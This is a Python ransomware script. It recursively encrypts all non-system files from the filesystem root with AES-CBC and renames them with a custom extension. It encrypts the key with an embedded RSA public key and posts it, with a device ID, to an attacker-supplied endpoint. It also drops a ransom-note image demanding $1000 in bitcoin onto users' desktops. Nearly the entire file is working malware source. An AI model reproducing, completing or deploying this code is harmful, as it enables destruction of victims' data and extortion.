#!/bin/env python3

import os
import sys
import secrets
from PIL import Image, ImageFont, ImageDraw
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.padding import PKCS7
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

MALWARE = 'malware.py'
MALWARE_BIN = 'malware.bin'
KEY_IV_DECRYPTOR = 'decrypt_key_iv.py'
SCRIPT = 'decrypt.sh'
DECRYPTOR = 'savior.py'
PRIVATE_KEY = 'private_key.pem'
KEY = 'key.key'
IMAGE = 'OPEN_ME.png'
KEY_LENGTH = 32
BLOCK_SIZE = 16
EXTENSION = 'CNECNECNE'
PUBLIC_KEY = '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1AZCAR5ArlvMDivxEWHV\ng96Giea1J+wLNdR2XbTmyU3TJH/iHiCQribkNKQKt8I5ozI87CS6HppzJ9iYOGPh\nUA/OakHU19RUvBlcgu+X73rDDsf/NJdjV+aJefVT+P6RP6bTc+3uetW2XvRg+LZF\nbu5431XMyKO7QOgvd4weHUbMcCBVrKM3YJ+h6zFp6r0fwIlTUa20/iUaD5+VrOD+\nQzrgf/Xrl0kqO7XFkPrci3eNM4tSJcID6uGzs9AbLtglgj5Cmrxn5ZQJ2dLhTPoZ\nOwZYk+LJ/sh0az/1Qo0WjgS/iGWcndf1AZuS2DHjEcbXm+IlJ0nvLwbXJLrFxD5/\nQwIDAQAB\n-----END PUBLIC KEY-----'

NOT_ENCRYPT =  {
    'win': ['C:\Windows', 'C:\Program Files', 'C:\Program Files (x86)', 'C:\ProgramData'],
    'linux': ['bin', 'boot', 'dev', 'etc', 'lib', 'lib32', 'lib64', 'proc', 'sbin', 'sys', 'usr', 'var', 'run', 'snap'],
    'macOS': ['/System', '/Library', '/bin', '/sbin'],
}

def add_padding(msg):
    padder = PKCS7(128).padder()
    return padder.update(msg) + padder.finalize()

def encrypt_files(cipher, files):
    encrypted = []
    for file in files:
        encryptor = cipher.encryptor()
        try:
            with open(file, 'rb') as f:
                data = f.read()
            data_padded = add_padding(data)
            ciphertext = encryptor.update(data_padded) + encryptor.finalize()
            with open(file, 'wb') as f:
                f.write(ciphertext)
            os.rename(file, f'{file}.{EXTENSION}')
            encrypted.append(file)
        except:
            continue

    total = len(encrypted)
    print(f"{total} files encrypted | {len(files) - total} files not encrypted")
    
    return encrypted

def list_directory(operative_system):
    to_encrypt = []

    root_dir = os.path.abspath(os.sep)

    for root, directories, files in os.walk(root_dir):
        if root == root_dir:
            d = []
            for dir in directories:
                if dir in NOT_ENCRYPT[operative_system]:
                    d.append(dir)
            for dir in d:
                directories.remove(dir)
        for filename in files:
            if filename in [MALWARE, DECRYPTOR, KEY, IMAGE, PRIVATE_KEY, MALWARE_BIN, KEY_IV_DECRYPTOR, SCRIPT]:
                continue
            if filename.endswith(EXTENSION):
                continue
            to_encrypt.append(os.path.join(root, filename))

    return to_encrypt

def encrypt_keys(keys, id, endpoint):
    public_key = serialization.load_pem_public_key(
        PUBLIC_KEY.encode(),
        backend=default_backend()
    )

    ciphertext = public_key.encrypt(
        keys,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    with open(KEY, 'wb') as key_file:
        key_file.write(ciphertext)
    try:
        requests.post(endpoint, json={
            'deviceId': id,
            'encryptionKey': ciphertext
        })
    except:
        pass

def crypto_setup(id, endpoint):
    key = secrets.token_bytes(KEY_LENGTH)
    iv = secrets.token_bytes(BLOCK_SIZE)

    to_encrypt = bytes(f'{key.hex()}\n{iv.hex()}', 'utf-8')
    encrypt_keys(to_encrypt, id, endpoint)

    cipher = Cipher(
        algorithm=algorithms.AES(key),
        mode=modes.CBC(iv),
        backend=default_backend()
    )

    return cipher

def generate_id():
    # Generate a random number with 128 bits of entropy
    random_number = secrets.randbits(128)

    # Convert the random number to a hexadecimal string
    hex_string = hex(random_number)[2:]

    # Pad the string with leading zeros if necessary
    hex_string = hex_string.zfill(32)

    # Convert the hexadecimal string to a byte string
    byte_string = bytes.fromhex(hex_string)

    # Encode the byte string as a base64 string
    return byte_string.hex()


def spawn_image(id):
    # Create a new image with a blank red background
    img = Image.new('RGB', (1080, 400), color='red')

    # Create a new ImageDraw object to draw on the image
    draw = ImageDraw.Draw(img)

    # Create the different fonts to be used
    try:
        font = ImageFont.truetype("arial.ttf", 24)
        font2 = ImageFont.truetype("arial.ttf", 28)
        font3 = ImageFont.truetype("arial.ttf", 36)
    except:
        font = ImageFont.load_default()
        font2 = ImageFont.load_default()
        font3 = ImageFont.load_default()

    # Draw the first rectangle
    draw.rectangle((0, 0, 1080, 80), fill='orange')

    text_width, text_height = draw.textsize("!!! Your files have been encrypted !!!", font2)
    x = (1080 - text_width) // 2
    y = (80 - text_height) // 2
    draw.text((x, y), "!!! Your files have been encrypted !!!", font=font2, fill="red")

    # Draw the informations about the payment
    start_at = 120
    draw.rectangle((24, start_at, 1056, start_at + 160), outline='white', width=3)
    text_width, text_height = draw.textsize("To gain access to your files send $1000 worth of bitcoin with the following description:", font)
    x = (1080 - text_width) // 2
    y = (50 - text_height) // 2 + (start_at + 10)
    draw.text((x, y), "To gain access to your files send $1000 worth of bitcoin with the following description:", font=font, fill="yellow")
    text_width, text_height = draw.textsize(id, font)
    x = (1080 - text_width) // 2
    y = (50 - text_height) // 2 + (start_at + 40)
    draw.text((x, y), id, font=font, fill="white")

    text_width, text_height = draw.textsize("to the address:", font)
    x = (1080 - text_width) // 2
    y = (50 - text_height) // 2 + (start_at + 70)
    draw.text((x, y), "to the address:", font=font, fill="yellow")
    text_width, text_height = draw.textsize("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", font)
    x = (1080 - text_width) // 2
    y = (50 - text_height) // 2 + (start_at + 100)
    draw.text((x, y), "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", font=font, fill="white")

    start_at = start_at + 200
    text_width, text_height = draw.textsize("SEE YOU SOON  ¯\_(' - ')_/¯", font3)
    x = (1080 - text_width) // 2
    y = (40 - text_height) // 2 + start_at
    draw.text((x, y), "SEE YOU SOON  ¯\_(' - ')_/¯", font=font3, fill="white")

    # Save the image to a file
    home_dir = '/home'
    paths = [IMAGE, os.path.join(home_dir, IMAGE)]
    entries = os.listdir(home_dir)
    for entry in entries:
        current_path = os.path.join(home_dir, entry)
        if os.path.isdir(current_path):
            desktop_path = os.path.join(current_path, 'Desktop')
            if os.path.exists(desktop_path) and os.path.isdir(desktop_path):
                paths.append(os.path.join(desktop_path, IMAGE))
    for path in paths:
        img.save(path)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('USAGE: ./malware [ENDPOINT]')
        exit()
    
    endpoint = sys.argv[1]
    id = generate_id()
    cipher = crypto_setup(id, endpoint)
    while True:
        files = list_directory('linux')
        if len(files) != 0:
            encrypted_files = encrypt_files(cipher, files)
            spawn_image(id)
            with open('encrypt.log', 'a') as log_file:
                log_file.write('\n'.join(encrypted_files))
